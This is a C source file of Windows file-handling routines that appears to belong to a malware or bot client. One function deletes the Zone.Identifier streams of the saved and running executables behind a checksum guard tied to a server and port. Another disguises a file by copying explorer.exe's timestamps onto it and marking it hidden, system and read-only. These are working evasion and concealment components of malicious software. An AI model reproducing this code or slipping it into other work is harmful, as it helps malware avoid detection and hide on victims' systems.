#include "../Includes/includes.h"

void DeleteZoneIdentifiers()
{
    // <!-------! CRC AREA START !-------!>
    int nLen;
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s:%i", cServer, usPort);
    char *cStr = cCheckString;
    unsigned long ulCheck = 794837-789456;
    while((nLen = *cStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nLen;
    if(ulCheck != ulChecksum3)
        strcpy(cZoneIdentifierSuffix, ":...");
    // <!-------! CRC AREA STOP !-------!>

    char cSavedFileZoneIdentifier[MAX_PATH];
    memset(cSavedFileZoneIdentifier, 0, sizeof(cSavedFileZoneIdentifier));
    strcpy(cSavedFileZoneIdentifier, cFileSaved);
    strcat(cSavedFileZoneIdentifier, cZoneIdentifierSuffix);

    char cThisFileZoneIdentifier[MAX_PATH];
    memset(cThisFileZoneIdentifier, 0, sizeof(cThisFileZoneIdentifier));
    strcpy(cThisFileZoneIdentifier, cThisFile);
    strcat(cThisFileZoneIdentifier, cZoneIdentifierSuffix);

    DeleteFile(cSavedFileZoneIdentifier);
    DeleteFile(cThisFileZoneIdentifier);

    return;
}

bool AppendToFile(char *cFile, char *cStringToAdd)
{
    bool bReturn = FALSE;

    FILE * pFile;
    pFile = fopen(cFile, "a+");
    if(pFile != NULL)
    {
        if(fputs(cStringToAdd, pFile))
            bReturn = TRUE;

        fclose(pFile);
    }

    return bReturn;
}

char cFileContentsReturn[250000];
char *GetContentsFromFile(char *cFile)
{
    HANDLE hFile = CreateFile(cFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile != NULL)
    {
        DWORD dwFileSize = GetFileSize(hFile, NULL);

        DWORD dwRead;
        LPBYTE lpBuffer = (BYTE*)malloc(dwFileSize);

        ReadFile(hFile, (LPVOID)lpBuffer, dwFileSize, &dwRead, NULL);
        CloseHandle(hFile);

        strcpy(cFileContentsReturn, (const char*)lpBuffer);
        free(lpBuffer);

        return (char*)cFileContentsReturn;
    }
    else
        return (char*)"-";
}

bool IsFileSystemOrHidden(const char *cFileName)
{
    DWORD dwAttribs = GetFileAttributes(cFileName);
    if (dwAttribs & FILE_ATTRIBUTE_HIDDEN || dwAttribs == FILE_ATTRIBUTE_SYSTEM)
        return TRUE;
    else
        return FALSE;
}

bool DirectoryExists(const char *cDirName) //Checks for existance of a given directory
{
    DWORD dwAttribs = GetFileAttributes(cDirName);
    if (dwAttribs & FILE_ATTRIBUTE_DIRECTORY)
        return TRUE;
    else
        return FALSE;
}

bool FileExists(LPSTR lpszFilename) //Checks for existance of a given file or directory
{
    DWORD dwAttr = GetFileAttributes(lpszFilename);
    if(dwAttr == 0xffffffff)
        return FALSE;
    else
        return TRUE;
}

bool HideFile(char *pcFile)
{
    char cShellFilePath[MAX_PATH];
    strcpy(cShellFilePath, cWindowsDirectory);
    strcat(cShellFilePath, "\\explorer.exe");

    HANDLE hShell = CreateFile(cShellFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if(hShell != INVALID_HANDLE_VALUE)
    {
        FILETIME ftCreated;
        FILETIME ftAccessed;
        FILETIME ftWritten;
        GetFileTime(hShell, &ftCreated, &ftAccessed, &ftWritten);
        CloseHandle(hShell);

        HANDLE hTargetFile = CreateFile(pcFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);

        if(hTargetFile != INVALID_HANDLE_VALUE)
        {
            SetFileTime(hTargetFile, &ftCreated, &ftAccessed, &ftWritten);
            CloseHandle(hTargetFile);
        }
    }

    if(SetFileAttributes(pcFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY) > 0)
        return TRUE;
    else
        return FALSE;
}

bool SetFileNormal(char *cFile)
{
    if(SetFileAttributes(cFile, FILE_ATTRIBUTE_NORMAL) > 0)
        return TRUE;
    else
        return FALSE;
}
